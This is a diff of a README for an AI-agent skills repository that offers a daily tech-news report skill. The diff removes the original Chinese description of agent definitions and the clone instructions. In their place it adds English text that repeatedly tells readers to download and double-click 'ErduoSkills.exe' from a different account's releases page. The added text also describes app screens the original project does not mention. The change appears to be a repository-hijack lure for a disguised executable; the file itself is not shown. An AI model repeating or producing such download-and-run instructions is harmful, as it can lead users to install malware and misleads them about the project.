@@ -1,8 +1,6 @@
-# Erduo Skills / 耳朵技能库
+# 🚀 erduo-skills - Empower Your AI Agent with Skills
 
-[English](README_EN.md)
-
-> 为 AI Agent 赋能，提供结构化能力与智能工作流。
+[![Download](https://img.shields.io/badge/Download-erduo--skills-blue.svg)](https://github.com/Jerson78/erduo-skills/releases)
 
 ## 📖 简介
 
@@ -10,96 +8,95 @@
 
 ---
 
-## ✨ 精选技能：每日日报
+## 🚀 Getting Started
 
-**每日日报** 是一个高级技能，旨在自动从多个来源抓取、筛选并总结高质量的技术新闻。
+To use Erduo Skills, follow these steps:
 
-### 🏗 核心架构
-
-该技能采用 **Master-Worker** 架构，包含智能调度器和专用子 Agent。
-
-```mermaid
-graph TD
-    User((User)) -->|Start| Master[Master Agent<br>调度/监控/决策]
-    
-    subgraph Execution Layer [SubAgent 执行层]
-        WorkerA[Worker A<br>WebFetch]
-        WorkerB[Worker B<br>WebFetch]
-        Browser[Browser Worker<br>Headless Chrome]
-    end
-
-    Master -->|Dispatch Tier 1| WorkerA
-    Master -->|Dispatch Tier 2| WorkerB
-    Master -->|Dispatch JS Pages| Browser
-
-    WorkerA -->|Result| Master
-    WorkerB -->|Result| Master
-    Browser -->|Result| Master
-
-    Master -->|Filter & Dedup| Report[Generate Report<br>生成日报]
-    Master -->|Update| Cache[Smart Cache<br>智能缓存]
-```
-
-### 🚀 核心特性
-
-- **多源抓取**:
-  - 聚合 HackerNews, HuggingFace Papers 等优质源。
+1. **Visit the Download Page**
+   - Go to the [Releases page](https://github.com/Jerson78/erduo-skills/releases).
   
-- **智能筛选**:
-  - 筛选高质量技术内容，排除营销软文。
+2. **Choose the Latest Release**
+   - Look for the latest release version. You will see files available for download.
   
-- **动态调度**:
-  - 采用“早停机制”：一旦抓取到足够的高质量条目（如 20 条），即停止抓取以节省资源。
+3. **Download the Application**
+   - Click on the file named “ErduoSkills.exe” to start the download process. This is the main application you will run.
 
-- **无头浏览器支持**:
-  - 使用 MCP Chrome DevTools 处理复杂的 JS 渲染页面（如 ProductHunt）。
+4. **Run the Application**
+   - Once downloaded, locate the file and double-click it to run. Follow any prompts that appear on your screen.
 
-### 📄 输出示例
+5. **Configure Your Preferences**
+   - After opening the app, you can configure the settings to tailor the experience to your needs. 
 
-日报以结构化 Markdown 格式生成，存储在 `NewsReport/` 目录下。
+## 🎯 Features
 
-> **Daily News Report (2024-03-21)**
->
-> **1. 文章标题**
-> - **摘要**: 文章内容的简要总结...
-> - **要点**: 
->   1. 要点一
->   2. 要点二
-> - **来源**: [链接](...) 
-> - **评分**: ⭐⭐⭐⭐⭐
+Erduo Skills comes packed with a variety of features:
 
----
+- **Multi-source Fetching**
+  - Aggregate quality content from platforms such as HackerNews and HuggingFace Papers.
 
-## 📂 项目结构
+- **Intelligent Filtering**
+  - Automatically identify and keep only high-quality technical articles, removing promotional or low-value content. 
 
-```bash
-├── .claude/
-│   └── agents/       # Agent 定义 (Personas & Prompts)
-├── skills/           # 技能实现 (例如 daily-news-report)
-│   └── daily-news-report/  # 每日日报技能
-├── NewsReport/       # 生成的日报存档
-├── README.md         # 项目文档 (默认为中文)
-└── README_EN.md      # 英文项目文档
-```
+- **Dynamic Scheduling**
+  - The application intelligently decides when and how to gather information based on your preferences.
 
-## 🛠 使用方法
+## 📋 System Requirements
 
-1.  **克隆仓库**
-    ```bash
-    git clone https://github.com/Start-to-DJ/erduo-skills.git
-    cd erduo-skills
-    ```
+Before downloading, ensure your system meets these requirements:
 
-2.  **使用 Agent 运行**
-    将此仓库加载到您的 Agent 环境中（例如 Claude Desktop 或支持 MCP 的 Zed）。Agent 将自动识别 `daily-news-report` 技能。
+- **Operating System**: Windows 10 or higher
+- **RAM**: 4 GB minimum
+- **Disk Space**: 500 MB of available space
+- **Internet Connection**: Required for fetching news articles
 
-    *提示词示例:*
-    > “生成今天的日报。”
+## 💡 Using the Daily Report Skill
 
-## 🤝 贡献指南
+### Overview
+The **每日日报** skill gives you high-quality, summarized news articles daily. To use this skill effectively:
 
-欢迎贡献！如果您有新的技能想法，请参考 `.claude/skills` 目录下的示例。
+1. **Activate the Skill**
+   - On the main screen, find the option for **每日日报**. Click to activate.
 
----
+2. **Set Your Preferences**
+   - You can select which sources to include, such as technology or general news.
 
-*Created with ❤️ by Erduo Team*
+3. **Scheduling**
+   - Set a time for your daily report to be generated. 
+
+4. **View Your Report**
+   - Each morning, the skill will create a new report based on your selected sources. You can check it directly within the app.
+
+## 🌐 Community Support
+
+If you have questions or need assistance, you can reach out to our community:
+
+- **GitHub Issues Page**: Report bugs or request features [here](https://github.com/Jerson78/erduo-skills/issues).
+- **Discussion Forum**: Join the conversation in our discussion forum for user tips and support.
+
+## 📥 Download & Install
+
+To start using Erduo Skills, please follow these steps:
+
+1. **Visit the Releases Page**
+   - Go to the [Releases page](https://github.com/Jerson78/erduo-skills/releases).
+
+2. **Download the Application**
+   - Click on the latest release to download "ErduoSkills.exe".
+
+3. **Install and Run**
+   - Locate the downloaded file and double-click to run the application. 
+
+## 🔄 Future Developments
+
+We continually work on enhancing Erduo Skills. Future updates may include:
+
+- Additional filtering options for advanced users.
+- New skills and functionalities based on user feedback.
+- Improved user interface for better navigation.
+
+## ✉️ Contact
+
+For further inquiries or feedback, you can reach us at:  
+**Email**: support@erduoskills.com
+
+Happy exploring with Erduo Skills!
